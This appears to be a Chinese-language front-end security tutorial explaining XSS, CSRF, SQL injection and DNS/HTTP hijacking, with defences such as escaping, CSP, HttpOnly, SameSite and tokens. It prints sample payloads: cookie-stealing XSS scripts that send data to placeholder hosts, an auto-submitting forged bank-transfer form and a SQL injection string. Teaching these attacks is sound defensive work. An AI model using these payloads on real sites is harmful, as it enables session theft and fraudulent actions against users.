## XSS 攻击

> XSS （Cross Site Scriptng）是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段；

跨站脚本攻击（XSS）一般的操作手法是：攻击者能够嵌入恶意代码（一般是 JS 代码）到网页中，当用户正常访问页面时，导致“非法”脚本执行（一般是发送一些敏感信息到攻击者服务器），达到攻击的目的

可以理解为 XSS 攻击就是利用网站使用了 URL 上的参数渲染网页内容，但是没有仔细校验其中的参数内容，导致前端在解析参数时，执行了一些“非法”脚本（一般是发送一些敏感信息到攻击者服务器）

这种攻击的缺点很明显：就是这种攻击一般会留下攻击者的服务器地址溯源

注入恶意脚本可以完成这些事情：

1. 窃取 Cookie；
2. 监听用户行为，比如输入账号密码后发给黑客服务器；
3. 在网页中生成浮窗广告；
4. 修改 DOM 伪造登入表单；

### 存储型 XSS 型

存储型 XSS 攻击一般是有牵涉服务端的，所以不像 DOM 型攻击那样是一次性的，它是永久性有效的，一般的触发流程是：

- 攻击者利用站点漏洞将一段恶意 JS 代码，并成功提交保存到网站的数据库中；
- 其他用户向网站请求查看包含了恶意 JS 脚本的页面；
- 当用户浏览该页面的时候，恶意脚本就会将用户信息等数据上传到服务器；

场景：

比如攻击者在网站评论区提交一份脚本代码，假设前后端没有做好转义工作内容上传到服务器，在其他用户访问页面时，看到评论区，这段恶意代码就会直接执行。

### 反射型 XSS 型

> 反射型 XSS 攻击指的就是恶意脚本作为网络请求的一部分，随后网站又把恶意的 JavaScript 脚本返回给用户，当恶意 JavaScript 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作；

反射型 XSS 一般是通过 URL 参数直接注入一些“恶意”脚本代码

场景：

```javascript
http://TianTianUp.com?query=<script>alert(document.cookie)</script>
```

服务器拿到后解析参数 query，最后将内容返回给浏览器，浏览器将这些内容作为 HTML 的一部分解析，发现是 Javascript 脚本，直接执行，这样子被 XSS 攻击了；

这也就是反射型名字的由来，将恶意脚本作为参数，通过网络请求，最后经过服务器，在反射到 HTML 文档中，执行解析；

### DOM 型

> 基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的，攻击者通过各种手段将恶意脚本注入用户的页面中，在数据传输的时候劫持网络数据包；

DOM 型 XSS 攻击一般是，被执行的恶意脚本会修改页面脚本结构，通过客户端就可以防御

反射型和储存型 XSS 漏洞都表现出一种特殊的行为模式，其中应用程序提取用户控制的数据并以危险的方式将这些数据返回给用户。

前端的脚本程序可以通过 DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行。基于这个特性，就可以利用 JS 脚本来实现 XSS 漏洞的利用。

DOM 型 XSS 是不用与服务端交互的，它只发生在客户端数据处理阶段，攻击者的 JS 代码一般通过下面这个方式提交：

- 用户请求一个点击专门设计的 URL，它由攻击者在其中嵌入了一些 js 代码
- 服务器的响应中并不以任何形式包含攻击者的代码
- 当用户在浏览器处理这个响应时，受到攻击

有可能触发 DOM 型 XSS 的属性：

- document.referer 属性
- window.name 属性
- location 属性
- innerHTML 属性
- document.write 属性

假设网站默认语言是可以根据网址的参数参数 lang= English 来渲染的，此时我们将网址的 default 参数改成下面这种，那估计就会出问题了：

```javascript
?lang=<script>(function(){ const xhr = new XMLHttpRequest(); xhr.open('GET', 'http://xxx.com?a=' + document.cookie); xhr.send() })()</script>
```

上面这种情况，一般在代码里对页面参数进行判断，对 < script > 标签进行处理，避免执行恶意脚本

禁止了 < script > 标签的恶意执行，还有一个标签也能达到这个效果，就是 < img > 标签的 onerror 属性，这个属性允许我们传入动态拼接的方法

```html
<img
  src="1.png"
  onerror="(function(){ const xhr = new XMLHttpRequest(); xhr.open('GET', 'http://1.2.3.4?param=' + document.cookie); xhr.send() })()"
/>
```

如果此时页面有个元素节点是根据 query 取值到页面 div 进行渲染，可以处理成

```html
</div><img src="1.png" onerror="(function(){ const xhr = new XMLHttpRequest(); xhr.open('GET', 'http://1.2.3.4?param=' + document.cookie); xhr.send() })()" />
```

这时候< img > 标签就也能达到攻击网站的效果

以上的情况，基本都是这类情况：代码会通过页面网址 query 取值来渲染页面，此时如果没有对 query 进行处理，很容易被攻击；

针对这个情况，可以代码通过对页面 query 的值进行过滤，比如 switch case 来排除给定选项以外的其它选项

### 解决方法

XSS 攻击原理就是：让恶意脚本直接在浏览器执行，主要的解决方法就是控制前端输入内容和限制特定字符、脚本执行

#### 对输入内容进行过滤或转码

对用户输入的信息进行过滤或者转码，进行特定字符过滤，例如 <、>等符号

```javascript
&lt;script&gt;alert(&#39;你受到XSS攻击了&#39;)&lt;/script&gt;
```

#### CSP（内容安全策略）

核心思想就是服务器决定浏览器加载哪些资源，该实现基于一个 Content-Security-Policy 的 HTTP 首部；

实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，它的实现和执行全部由浏览器完成，开发者只需提供配置；

- 限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；
- 禁止向第三方域提交数据，这样用户数据也不会外泄；
- 提供上报机制，能帮助我们及时发现 XSS 攻击；
- 禁止执行内联脚本和未授权的脚本；

##### 限制方式

- default-src 限制全局；
- 制定限制类型：connect-src、mainfest-src、img-src、font-src、media-src、style-src、frame-src、script-src…
  - 资源类型有：connect-src、mainfest-src、img-src、font-src、media-src、style-src、frame-src、script-src…

#### HttpOnly

由于很多 XSS 攻击都是来盗用 Cookie 的，对于重要的 cookie 设置 httpOnly， 防止客户端通过 document.cookie 读取 cookie，这个由服务端进行控制

```javascript
Set-Cookie: JSESSIONID=xxxxxx;Path=/;Domain=book.com;HttpOnly
```

## CSRF 攻击

> 跨站请求伪造（Cross-site request forgery）是指黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事；

跨站请求伪造（Cross-site request forgery）指的是攻击者利用受害者未失效（过期）的身份认证信息（cookie、会话等），诱骗其点击或打开恶意链接， 完成在受害者不知情的情况下以受害者身份向被攻击网站发送请求，从而完成非法操作（转账、改密等）

CSRF 不同与 XSS 攻击，它没有拿到受害者的 cookie，只是利用受害者的登陆状态，“仿冒”受害者进行操作，达到攻击的目的

1. 攻击一般发起在**第三方网站**，而不是被攻击的网站，被攻击的网站无法防止攻击发生；
2. 攻击者的目标站点具有持久化授权 cookie 或者受害者具有当前会话 cookie，冒充受害者提交操作，而不是拿到“登录凭证”
3. 跨站请求可以用各种方式：图片 URL、超链接、CORS、Form 提交等等，部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪；

### 自动发起 POST 请求

黑客网页中有一个表单，自动提交的表单:

```javascript
<form action="http://bank.example/withdraw" method=POST>
  <input type="hidden" name="account" value="xiaoming" />
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="for" value="hacker" />
</form>
<script> document.forms[0].submit(); </script>
```

访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作；

会携带相应的用户 cookie 信息，让服务器误以为是一个正常的用户在操作，让各种恶意的操作变为可能；

### 引诱用户点击链接

这种需要诱导用户去点击链接才会触发，这类的情况比如在论坛中发布照片，照片中嵌入了恶意链接，或者是以广告的形式去诱导，比如：

```javascript
<a href="www.icbc.com.cn/transfer?toBankId=黑客的账户&money=金额">
```

如果这个用户恰好登录了 icbc.com，那他的 cookie 还在，当他禁不住诱惑，点了这个链接后，一个转账操作就神不知鬼不觉的发生了；

### 解决方法

> 保护的关键就是在请求中放入黑客所不能伪造的信息；

#### 用户操作限制（验证码）

CSRF 攻击往往是在用户不知情的情况下构造了网络请求，所以在关键请求前可以增加二次验证环节，强制用户与应用进行交互，才能完成 请求

#### Referer Check（请求来源校验）

在服务器端验证请求来源的站点：通过 HTTP 请求头中的 Header：Origin Header 和 Referer Header，服务器通过解析这两个 Header 中的域名，确定请求的来源域；

- orgin 只包含域名信息，Referer 包含了具体的 URL 路径；
- 这两者都是可以伪造的，通过 AJax 中自定义请求头，安全性略差；

#### SameSite（限制 cookie）

> SameSite 是 HTTP 响应头 Set-Cookie 的属性，它允许声明该 Cookie 是否仅限于第一方或同一站点上下文；

SameSite 可以设置为三个值：

- **Strict**：浏览器完全禁止第三方请求携带 Cookie，比如 xxx.com 网站只能在 xxx.com 域名当中请求才能携带 Cookie，其它网站的请求都不行；
- **Lax**：只能在 get 方法提交表单 或 < a > 标签发送 get 请求时可以携带 Cookie，其它情况均不能；
- **None**：Cookie 在所有情况下发送，也可以允许跨域发送；

#### Token 验证

攻击者无法直接窃取到用户的信息，只是冒用 Cookie 中的信息，可以使用 Token；

1. 用户打开页面的时候，服务器给用户生成一个 Token，该 Token 通过加密算法进行加密；
2. 在提交时 Token 不能再放在 Cookie 中了（XSS 可能会获取 Cookie）；
3. Token 还是存在服务器的 Session 中，之后在每次页面加载时，使用 JS 遍历整个 DOM 树，对于 DOM 中所有的 a 和 form 标签后加入 Token；
4. 页面提交的请求携带这个 Token，服务器验证 Token 是否正确；

## SQL 注入

SQL 注入是针对开发者编写的疏忽，导致攻击者可以将 SQL 语句代入到数据库中直接查询或更改

### 漏洞危害

SQL 注入可能导致的问题：

- **数据库信息泄露**：可能导致数据库中关于用户隐私的数据泄露
- 网页篡改：通过操作表中的数据对特定的网页数据修改
- 网站被挂马，传播恶意软件：修改表里一些字段的值，嵌入网马链接，进行挂马攻击
- 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户可能被修改

假设查询数据库用户表中是否存在用户名为 userName 变量，密码为 password 变量的用户：

```java
const sql = 'select * from user_table where username= "'+ userName +'" and password = "' + password + '"';
```

但是如果黑客输入的密码是 1"or"1"="1 就会出现问题, 这是一条永远可以执行成功的 sql：

```javascript
const userName = "yd"
const password = '1"or"1"="1'

const sql =
  'select * from user_table where username= "' +
  userName +
  '" and password = "' +
  password +
  '"'

// select * from user_table where username= "yd" and password = "1" or"1"="1"
```

### SQL 注入防范

解决 SQL 注入的关键问题：

- 对用户输入的内容进行严格的检查

  - 对用户输入的内容进行转义和过滤

    ​

- 数据库配置使用最小权限原则

## 请求劫持

### DNS 劫持

DNS 服务器就是域名服务器，它会把域名转换为 ip 地址，如果这个地址被篡改了，那跳转的网站就不是目的网站，我们电脑中有一个 host 文件，就是本地 DNS，这个 host 文件会被篡改；

### HTTP 劫持

HTTP 本身是明文传输，并且传输的工程中很可能中间的某一环节被篡改；

####
